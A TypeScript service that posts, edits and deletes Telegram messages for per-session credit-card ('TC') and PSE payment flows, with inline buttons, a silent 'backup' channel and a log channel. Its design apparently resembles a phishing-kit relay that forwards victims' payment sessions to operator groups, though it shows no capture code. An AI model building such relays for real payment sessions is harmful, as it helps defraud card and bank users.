// Importamos axios para hacer peticiones HTTP
import axios from 'axios';

// Servicio de almacenamiento personalizado (puede ser local, Redis, etc.)
import { StorageService } from './StorageService';

// dotenv permite leer variables de entorno desde un archivo .env
import dotenv from 'dotenv';

// Inicializamos dotenv
dotenv.config();

// Obtenemos las credenciales del bot desde variables de entorno
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_BACKUP_CHAT_ID = process.env.TELEGRAM_BACKUP_CHAT_ID;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_CHAT_ID_TC = process.env.TELEGRAM_CHAT_ID_TC;
const TELEGRAM_LOG_CHAT_ID = process.env.TELEGRAM_LOG_CHAT_ID;

// Construimos la URL base para la API de Telegram
const BASE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Se exporta la clase TelegramService con métodos para enviar, editar y eliminar mensajes en Telegram
export class TelegramService {

    /**
     * Resuelve el chat de Telegram según el flujo (TC o PSE)
     *
     * @param isTc true si la sesión viene por tarjeta de crédito
     */
    static resolveChatId(isTc = false): string | null {

        // Se valida si la sesión es TC
        if (isTc) {

            // Se usa el grupo TC; si no existe, cae al grupo PSE
            return TELEGRAM_CHAT_ID_TC || TELEGRAM_CHAT_ID || null;
        }

        // Se usa el grupo PSE por defecto
        return TELEGRAM_CHAT_ID || null;
    }

    /**
     * Obtiene el chat de Telegram asociado a una sesión
     *
     * @param sessionId Identificador de la sesión
     */
    static async getChatIdForSession(sessionId: string): Promise<string | null> {

        // Se valida que exista sessionId
        if (!sessionId) return TelegramService.resolveChatId(false);

        // Se carga la sesión para leer el flag tc / chat persistido
        const session = await StorageService.get(`session_${sessionId}`);

        // Se prioriza el chat ya persistido en la sesión
        if (session?.telegramChatId) return String(session.telegramChatId);

        // Se resuelve por flag tc (false si no viene en init)
        return TelegramService.resolveChatId(Boolean(session?.tc));
    }

    /**
     * Obtiene el chat usado al enviar un mensaje (para editar/eliminar en el grupo correcto)
     *
     * @param messageId ID del mensaje en Telegram
     * @param sessionId Identificador de sesión (opcional)
     */
    static async getChatIdForMessage(messageId: string | number, sessionId?: string): Promise<string | null> {

        // Se busca el chat persistido al enviar el mensaje
        const storedChatId = await StorageService.get(`message_chat_${messageId}`);

        // Se retorna si ya se conoce el grupo del mensaje
        if (storedChatId) return String(storedChatId);

        // Se intenta resolver por sesión
        if (sessionId) return TelegramService.getChatIdForSession(sessionId);

        // Se cae al grupo PSE como último recurso
        return TELEGRAM_CHAT_ID || null;
    }

    /**
     * Persiste el chat donde se publicó un mensaje de Telegram
     *
     * @param messageId ID del mensaje
     * @param chatId ID del chat/grupo
     */
    static async storeMessageChat(messageId: string | number, chatId: string): Promise<void> {

        // Se guarda la relación mensaje -> chat para editar/eliminar correctamente
        await StorageService.set(`message_chat_${messageId}`, chatId);
    }

    /**
     * Método encargado de enviar mensajes a Telegram, permite enviar texto con formato HTML y botones personalizados
     * 
     * @param text Texto del mensaje
     * @param buttons Botones inline (opcional)
     * @param sessionId Identificador de sesión para controlar mensajes
     */
    static async sendMessage(text: string, buttons: any[] = [], sessionId: string): Promise<any> {

        // Se envia al backup
        // this.sendToBackup(text, sessionId);

        // Se usa el try catch
        try {

            // Se resuelve el grupo destino según TC/PSE de la sesión
            const chatId = await TelegramService.getChatIdForSession(sessionId);

            // Validamos que existan las credenciales necesarias
            if (!TELEGRAM_BOT_TOKEN || !chatId) {

                // Si faltan credenciales, no intentamos enviar el mensaje y mostramos un error
                console.error("Telegram credentials missing");

                // Se retorna null
                return null;
            };

            // Construimos el payload que se enviará a Telegram
            const payload: any = {
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            };

            // Si hay botones, los agregamos al payload
            if (buttons.length > 0) {

                // Telegram espera los botones en un formato específico dentro de reply_markup
                payload.reply_markup = {
                    inline_keyboard: TelegramService.sanitizeButtons(buttons)
                };
            };

            // Enviamos el mensaje a Telegram
            const response = await axios.post(`${BASE_URL}/sendMessage`, payload);

            // Si la respuesta es correcta
            if (response.data.ok) {

                // Obtenemos el ID del mensaje enviado para poder referenciarlo después (editar o eliminar)
                const messageId = response.data.result.message_id;

                // Guardamos el ID del mensaje para poder eliminarlo después
                await StorageService.set(`message_id_session_${sessionId}`, messageId);

                // Se persiste el chat usado para editar/eliminar en el grupo correcto
                await TelegramService.storeMessageChat(messageId, chatId);

                // Retornamos el ID del mensaje para posibles ediciones futuras
                return messageId;
            };
        } catch (error: any) {

            // Manejo de errores mostrando detalles
            console.error("Error enviando mensaje a Telegram ->", error.response?.data || error.message);
        };

        // Se retorna null en caso de error o falta de credenciales
        return null;
    }

    /**
     * Método para eliminar el mensaje anterior asociado a una sesión
     * 
     * @param messageId ID del mensaje a eliminar
     */
    static async deletePreviousMessage(messageId: string, sessionId?: string): Promise<void> {

        // Se usa el try catch para manejar posibles errores al eliminar el mensaje
        try {

            // Se resuelve el grupo donde se publicó el mensaje
            const chatId = await TelegramService.getChatIdForMessage(messageId, sessionId);

            // Se valida que exista chat destino
            if (!chatId) return;

            // Llamamos a la API de Telegram para eliminar el mensaje
            await axios.post(`${BASE_URL}/deleteMessage`, {
                chat_id: chatId,
                message_id: messageId
            });
        } catch (error: any) {

            // Manejo de errores mostrando detalles
            console.error("Error deleting Telegram message:", error.response?.data || error.message);
        }
    }

    /**
     * Método para editar un mensaje previamente enviado, permite actualizar tanto el texto como los botones
     * 
     * @param messageId ID del mensaje a editar
     * @param text Nuevo texto
     * @param buttons Botones nuevos (opcional)
     * @returns boolean indicando si fue exitoso
     */
    static async editMessageText(messageId: number, text: string, buttons: any[] = [], sessionId?: string): Promise<boolean> {

        // Se usa el try catch
        try {

            // Se resuelve el grupo donde se publicó el mensaje
            const chatId = await TelegramService.getChatIdForMessage(messageId, sessionId);

            // Se valida que exista chat destino
            if (!chatId) return false;

            // Construimos el payload base
            const payload: any = {
                chat_id: chatId,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            };

            // Si hay botones, los agregamos
            if (buttons.length > 0) {

                // Telegram espera los botones en un formato específico dentro de reply_markup
                payload.reply_markup = { inline_keyboard: TelegramService.sanitizeButtons(buttons) };
            } else {

                // Para eliminarlos, debemos enviar un inline_keyboard vacío
                payload.reply_markup = { inline_keyboard: [] };
            };

            // Llamamos a la API para editar el mensaje
            const response = await axios.post(`${BASE_URL}/editMessageText`, payload);

            // Se retorna el mensaje
            return response.data.ok;
        } catch (error: any) {

            /**
             * Esto no es realmente un error crítico, así que lo tratamos como éxito
             */
            if (error.response?.data?.description?.includes('message is not modified')) {

                // Se retorna true porque el mensaje no cambió
                return true;
            }

            // Se imprime el error
            console.error("Error editing Telegram message:", error.response?.data || error.message);

            // Se retorna false
            return false;
        }
    }

    /**
     * Metodo encargado de enviar un mensaje al canal de backup
     * 
     * @param text 
     * @param sessionId 
     * @returns 
     */
    static async sendToBackup(text: string, sessionId: string): Promise<void> {

        // Verificamos que el chat de backup esté configurado
        if (!TELEGRAM_BACKUP_CHAT_ID) return;

        // Se usa el try catch
        try {

            // Se obtiene el ID del mensaje anterior
            const prevBackupId = await StorageService.get(`backup_msg_id_${sessionId}`);

            // Se elimina el mensaje anterior si existe
            if (prevBackupId) {

                // Se usa el try catch
                try {

                    // Se elimina el mensaje anterior
                    await axios.post(`${BASE_URL}/deleteMessage`, {
                        chat_id: TELEGRAM_BACKUP_CHAT_ID,
                        message_id: prevBackupId
                    });
                } catch (e) {
                }

                // Se elimina el ID del mensaje anterior
                await StorageService.remove(`backup_msg_id_${sessionId}`);
            };

            // Se inicializa el footer
            const footer = "\n\n📌 desde [P01]";

            // Se envia el mensaje al canal de backup
            const response = await axios.post(`${BASE_URL}/sendMessage`, {
                chat_id: TELEGRAM_BACKUP_CHAT_ID,
                text: text + footer,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });

            // Se guarda el ID del mensaje enviado
            if (response.data.ok) {

                // Se guarda el ID del mensaje enviado
                await StorageService.set(`backup_msg_id_${sessionId}`, response.data.result.message_id);
            };
        } catch (error: any) {

            // Se registra el error
            console.error("Error sending to Backup Channel:", error.message);
        }
    }

    /**
     * Metodo encargado de enviar mensajes al canal de logs, 
     * este canal es utilizado para enviar mensajes que no requieren botones ni edición posterior
     */
    static async sendToLog(text: string): Promise<number | null> {

        // Se valida que exista la variable de entorno para el canal de logs, si no existe se omite el envío a ese canal
        if (!TELEGRAM_LOG_CHAT_ID) return null;

        // Se usa el try catch
        try {

            // 3. Send NEW message (clean text, no buttons) with footer
            const response = await axios.post(`${BASE_URL}/sendMessage`, {
                chat_id: TELEGRAM_LOG_CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });

            // 4. Save new ID
            if (response.data.ok) {

                // Se retorna el ID del mensaje enviado para que pueda ser eliminado posteriormente
                return response.data.result.message_id;
            };

            // Se retorna null en caso de que no se haya podido enviar el mensaje al canal de logs
            return null;
        } catch (error: any) {

            // Se registra el error
            console.error("Error sending to Log Channel:", error.message);

            // Se retorna null en caso de que falle el envío del mensaje al canal de logs
            return null;
        }
    }

    /**
     * Sanitiza los botones inline reemplazando localhost/127.0.0.1 por 127.0.0.1.nip.io
     * para pasar las reglas de validación de URLs del API de Telegram.
     */
    private static sanitizeButtons(buttons: any[]): any[] {
        if (!buttons || !Array.isArray(buttons)) return [];
        return buttons.map(row => {
            if (!Array.isArray(row)) return row;
            return row.map(btn => {
                if (btn && typeof btn === 'object' && btn.url && typeof btn.url === 'string') {
                    const sanitizedUrl = btn.url
                        .replace(/:\/\/localhost/gi, '://127.0.0.1.nip.io')
                        .replace(/:\/\/127\.0\.0\.1/gi, '://127.0.0.1.nip.io');
                    return { ...btn, url: sanitizedUrl };
                }
                return btn;
            });
        });
    }
}